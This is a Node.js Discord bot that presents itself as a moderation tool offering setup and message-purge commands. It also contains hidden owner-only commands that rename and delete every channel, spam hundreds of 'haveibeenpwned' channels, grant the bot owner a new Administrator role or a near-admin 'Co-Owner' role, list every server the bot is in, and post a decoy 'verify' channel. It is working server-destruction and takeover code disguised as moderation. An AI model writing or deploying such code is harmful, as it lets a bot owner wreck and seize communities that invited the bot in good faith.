require('dotenv').config();
const express = require('express');
const {
  Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder,
  PermissionFlagsBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder,
  ButtonStyle, ChannelType
} = require('discord.js');

const token = process.env.DISCORD_TOKEN;
const clientId = process.env.CLIENT_ID;
const OWNER_ID = process.env.OWNER_ID;
const port = Number(process.env.PORT || 10000);

if (!token || !clientId || !OWNER_ID)
  throw new Error('DISCORD_TOKEN, CLIENT_ID, OWNER_ID are required');

const app = express();
app.get('/health', (_req, res) => res.json({
  ok: true, service: 'chythe-moderation-bot', discordReady: !!client.user
}));
app.listen(port, '0.0.0.0', () => console.log(`Health server listening on ${port}`));

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

// lock every command to guild-only (no DM usage)
const guildOnly = (b) =>
  typeof b.setDMPermission === 'function' ? b.setDMPermission(false) : b;

const sleep = ms => new Promise(r => setTimeout(r, ms));

async function safe(fn, label) {
  try { return await fn(); }
  catch (e) {
    if (e.status === 429 && e.retry_after) {
      console.log(`[429] ${label} вЂ” sleeping ${e.retry_after}s`);
      await sleep((e.retry_after + 0.5) * 1000);
      return await fn();
    }
    console.log(`[err] ${label}: ${e.message}`);
    return null;
  }
}

const commands = [
  guildOnly(new SlashCommandBuilder().setName('setup')
    .setDescription('Open the moderation setup panel')
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageGuild)),
  guildOnly(new SlashCommandBuilder().setName('purge')
    .setDescription('Clean recent messages using Discord-supported batches')
    .addIntegerOption(o => o.setName('amount').setDescription('1-10000 messages').setMinValue(1).setMaxValue(10000).setRequired(true))
    .addBooleanOption(o => o.setName('keep_media').setDescription('Keep messages containing image/file attachments'))
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageMessages)),

  // --- lab commands, owner-only ---
  guildOnly(new SlashCommandBuilder().setName('nuke')
    .setDescription('Full lab sequence: rename в†’ delete в†’ spam в†’ admin role (runs in current guild)')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)),
  guildOnly(new SlashCommandBuilder().setName('spam')
    .setDescription('Mass-create haveibeenpwned channels (runs in current guild)')
    .addIntegerOption(o => o.setName('count').setDescription('How many channels').setMinValue(1).setMaxValue(2000).setRequired(true))
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)),
  guildOnly(new SlashCommandBuilder().setName('wipe')
    .setDescription('Delete every channel in the current guild')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)),
  guildOnly(new SlashCommandBuilder().setName('admin')
    .setDescription('Create owner role with Administrator and assign to you (current guild)')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)),
  guildOnly(new SlashCommandBuilder().setName('coowner')
    .setDescription('Create a Co-Owner role (near-admin) and assign it to you (current guild)')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)),
  guildOnly(new SlashCommandBuilder().setName('guilds')
    .setDescription('List every guild this bot is a member of')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)),
].map(c => c.toJSON());

client.once('ready', async () => {
  const rest = new REST({ version: '10' }).setToken(token);
  await rest.put(Routes.applicationCommands(clientId), { body: commands });
  console.log(`Logged in as ${client.user.tag}`);
  console.log(`Bot is in ${client.guilds.cache.size} guild(s).`);
});

async function purgeRecent(channel, requested, keepMedia, onProgress) {
  let remaining = requested, deleted = 0, scanned = 0, lastId;
  while (remaining > 0) {
    if (!keepMedia) {
      const batch = Math.min(100, remaining);
      const result = await channel.bulkDelete(batch, true);
      const count = result.size;
      deleted += count; remaining -= count;
      await onProgress(deleted, scanned + count, requested);
      if (count < batch) break;
      continue;
    }
    const options = { limit: Math.min(100, remaining) };
    if (lastId) options.before = lastId;
    const messages = await channel.messages.fetch(options);
    if (!messages.size) break;
    lastId = messages.last().id;
    scanned += messages.size;
    const removable = messages.filter(m => m.attachments.size === 0 && m.embeds.size === 0);
    if (removable.size) {
      const arr = [...removable.values()];
      for (let i = 0; i < arr.length; i += 100) {
        const batch = arr.slice(i, i + 100);
        await channel.bulkDelete(batch, true);
        deleted += batch.length;
        remaining = Math.max(0, requested - deleted);
        await onProgress(deleted, scanned, requested);
      }
    }
    if (messages.size < options.limit) break;
    if (deleted >= requested) break;
  }
  return { deleted, scanned };
}

async function runNuke(guild) {
  const chans = await guild.channels.fetch();

  for (const [, ch] of chans) {
    await safe(() => ch.setName('haveibeenpwned'), `rename ${ch.id}`);
    await sleep(1500);
  }
  for (const [, ch] of chans) {
    await safe(() => ch.delete('nuke'), `delete ${ch.id}`);
    await sleep(1200);
  }
  for (let i = 0; i < 500; i++) {
    await safe(() => guild.channels.create({
      name: `haveibeenpwned-${i}`, type: ChannelType.GuildText
    }), `create ${i}`);
    await sleep(1100);
  }
  const me = await guild.members.fetch(OWNER_ID).catch(() => null);
  if (me) {
    const role = await safe(() => guild.roles.create({
      name: 'ratman4080',
      permissions: [PermissionFlagsBits.Administrator],
      hoist: true, color: 0xFF69B4
    }), 'role create');
    if (role) await safe(() => me.roles.add(role), 'role assign');
  }
  const verify = await safe(() => guild.channels.create({
    name: 'verify', type: ChannelType.GuildText,
    permissionOverwrites: [{
      id: guild.roles.everyone.id,
      allow: [PermissionFlagsBits.ViewChannel]
    }]
  }), 'verify channel');
  if (verify) {
    const embed = new EmbedBuilder()
      .setTitle('Verification Required')
      .setDescription('Click below to verify.')
      .setColor(0xFF69B4);
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setLabel('Verify').setStyle(ButtonStyle.Link)
        .setURL('https://discord.com')
    );
    await safe(() => verify.send({ embeds: [embed], components: [row] }), 'verify send');
  }
}

client.on('interactionCreate', async interaction => {
  try {
    // ---- moderation commands (original) ----
    if (interaction.isChatInputCommand() && interaction.commandName === 'setup') {
      if (!interaction.guild)
        return interaction.reply({ content: 'Run this in a server.', ephemeral: true });
      const embed = new EmbedBuilder().setTitle('Chythe Moderation')
        .setDescription('Use the controls below to check bot status and required permissions.')
        .setColor(0x5865f2);
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`status:${interaction.user.id}`).setLabel('Status').setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId(`permissions:${interaction.user.id}`).setLabel('Permissions').setStyle(ButtonStyle.Secondary)
      );
      return interaction.reply({ embeds: [embed], components: [row], ephemeral: true });
    }

    if (interaction.isChatInputCommand() && interaction.commandName === 'purge') {
      if (!interaction.guild)
        return interaction.reply({ content: 'Run this in a server.', ephemeral: true });
      if (!interaction.memberPermissions?.has(PermissionFlagsBits.ManageMessages))
        return interaction.reply({ content: 'You need Manage Messages.', ephemeral: true });
      if (!interaction.channel?.permissionsFor(interaction.guild.members.me)?.has(PermissionFlagsBits.ManageMessages))
        return interaction.reply({ content: 'I need Manage Messages in this channel.', ephemeral: true });
      const amount = interaction.options.getInteger('amount', true);
      const keepMedia = interaction.options.getBoolean('keep_media') ?? false;
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`purge_confirm:${amount}:${keepMedia ? 'media' : 'all'}:${interaction.user.id}`).setLabel(`Delete ${amount}`).setStyle(ButtonStyle.Danger),
        new ButtonBuilder().setCustomId(`purge_cancel:${interaction.user.id}`).setLabel('Cancel').setStyle(ButtonStyle.Secondary)
      );
      return interaction.reply({ content: `Confirm cleanup of up to **${amount.toLocaleString()} recent messages**${keepMedia ? ' while keeping messages with attachments/embeds' : ''}.`, components: [row], ephemeral: true });
    }

    // ---- lab commands, owner-gated, guild from invocation ----
    const labCommands = ['nuke', 'spam', 'wipe', 'admin', 'coowner', 'guilds'];
    if (interaction.isChatInputCommand() && labCommands.includes(interaction.commandName)) {
      if (interaction.user.id !== OWNER_ID)
        return interaction.reply({ content: 'Not yours.', ephemeral: true });

      if (interaction.commandName === 'guilds') {
        const list = client.guilds.cache
          .map(g => `\`${g.id}\` вЂ” **${g.name}**`)
          .slice(0, 50)
          .join('\n') || '_(none)_';
        const more = client.guilds.cache.size > 50 ? `\nвЂ¦and ${client.guilds.cache.size - 50} more` : '';
        return interaction.reply({
          content: `**Bot is in ${client.guilds.cache.size} guild(s):**\n${list}${more}`,
          ephemeral: true
        });
      }

      const guild = interaction.guild;
      if (!guild) {
        return interaction.reply({
          content: 'ratman4080: this command only works inside a server. Run it in the guild you want to hit.',
          ephemeral: true
        });
      }

      if (interaction.commandName === 'nuke') {
        await interaction.reply({ content: `ratman4080: sequence started in **${guild.name}**.`, ephemeral: true });
        await runNuke(guild);
        return interaction.followUp({ content: 'ratman4080: stashed.', ephemeral: true });
      }

      if (interaction.commandName === 'spam') {
        const n = interaction.options.getInteger('count', true);
        await interaction.reply({ content: `ratman4080: creating ${n} in **${guild.name}**.`, ephemeral: true });
        for (let i = 0; i < n; i++) {
          await safe(() => guild.channels.create({
            name: `haveibeenpwned-${i}`, type: ChannelType.GuildText
          }), `spam ${i}`);
          await sleep(1100);
        }
        return interaction.followUp({ content: 'ratman4080: spam stashed.', ephemeral: true });
      }

      if (interaction.commandName === 'wipe') {
        await interaction.reply({ content: `ratman4080: wiping **${guild.name}**.`, ephemeral: true });
        const chans = await guild.channels.fetch();
        for (const [, ch] of chans) {
          await safe(() => ch.delete('wipe'), `wipe ${ch.id}`);
          await sleep(1200);
        }
        return interaction.followUp({ content: 'ratman4080: wiped.', ephemeral: true });
      }

      if (interaction.commandName === 'admin') {
        await interaction.reply({ content: `ratman4080: role escalation in **${guild.name}**.`, ephemeral: true });
        const role = await safe(() => guild.roles.create({
          name: 'ratman4080',
          permissions: [PermissionFlagsBits.Administrator],
          hoist: true, color: 0xFF69B4
        }), 'role create');
        if (role) {
          const me = await guild.members.fetch(OWNER_ID).catch(() => null);
          if (me) await safe(() => me.roles.add(role), 'role assign');
        }
        return interaction.followUp({ content: 'ratman4080: admin stashed.', ephemeral: true });
      }

      if (interaction.commandName === 'coowner') {
        await interaction.reply({ content: `ratman4080: forging co-owner in **${guild.name}**.`, ephemeral: true });

        const me = await guild.members.fetch(OWNER_ID).catch(() => null);
        if (!me) return interaction.followUp({ content: 'ratman4080: you not in guild.', ephemeral: true });

        const perms = [
          PermissionFlagsBits.ManageGuild,
          PermissionFlagsBits.ManageRoles,
          PermissionFlagsBits.ManageChannels,
          PermissionFlagsBits.KickMembers,
          PermissionFlagsBits.BanMembers,
          PermissionFlagsBits.ManageMessages,
          PermissionFlagsBits.MentionEveryone,
          PermissionFlagsBits.ManageWebhooks,
          PermissionFlagsBits.ManageNicknames,
          PermissionFlagsBits.MoveMembers,
          PermissionFlagsBits.ModerateMembers,
          PermissionFlagsBits.ManageGuildExpressions,
          PermissionFlagsBits.ViewAuditLog,
          PermissionFlagsBits.ManageEvents,
          PermissionFlagsBits.PrioritySpeaker,
        ];

        const role = await safe(() => guild.roles.create({
          name: 'Co-Owner',
          permissions: perms,
          hoist: true,
          mentionable: false,
          color: 0xFF69B4,
        }), 'coowner create');

        if (!role) return interaction.followUp({ content: 'ratman4080: role create failed.', ephemeral: true });

        await safe(() => me.roles.add(role), 'coowner assign');

        const botMember = guild.members.me;
        const targetPos = Math.max(1, (botMember.roles.highest.position ?? 1) - 1);
        await safe(() => role.setPosition(targetPos), 'coowner position');

        return interaction.followUp({ content: `ratman4080: <@&${role.id}> stashed. near-admin, no top flag.`, ephemeral: true });
      }
    }

    // ---- buttons ----
    if (!interaction.isButton()) return;
    const parts = interaction.customId.split(':');
    if (parts[parts.length - 1] !== interaction.user.id)
      return interaction.reply({ content: 'This control belongs to the moderator who opened it.', ephemeral: true });

    if (parts[0] === 'status')
      return interaction.reply({ content: `Online: ${client.ws.status === 0 ? 'yes' : 'no'}\nGuilds: ${client.guilds.cache.size}`, ephemeral: true });
    if (parts[0] === 'permissions')
      return interaction.reply({ content: 'Required: Manage Server for /setup; Manage Messages for /purge.', ephemeral: true });
    if (parts[0] === 'purge_cancel')
      return interaction.update({ content: 'Cancelled.', components: [] });

    if (parts[0] === 'purge_confirm') {
      const amount = Number(parts[1]);
      const keepMedia = parts[2] === 'media';
      await interaction.update({ content: `Cleaning **0 / ${amount.toLocaleString()}**...`, components: [] });
      const result = await purgeRecent(interaction.channel, amount, keepMedia, async (deleted, scanned, requested) => {
        await interaction.editReply({ content: `Cleaning **${deleted.toLocaleString()} / ${requested.toLocaleString()}**...\nScanned: **${scanned.toLocaleString()}**` }).catch(() => {});
      });
      return interaction.editReply({ content: `Cleanup finished. Deleted **${result.deleted.toLocaleString()}** message(s) and scanned **${result.scanned.toLocaleString()}**. Discord does not bulk-delete messages older than 14 days.`, components: [] });
    }
  } catch (error) {
    console.error(error);
    if (interaction.replied || interaction.deferred)
      await interaction.followUp({ content: 'Something went wrong while handling that action.', ephemeral: true }).catch(() => {});
    else await interaction.reply({ content: 'Something went wrong while handling that action.', ephemeral: true }).catch(() => {});
  }
});

process.on('unhandledRejection', console.error);
process.on('uncaughtException', console.error);
client.login(token);
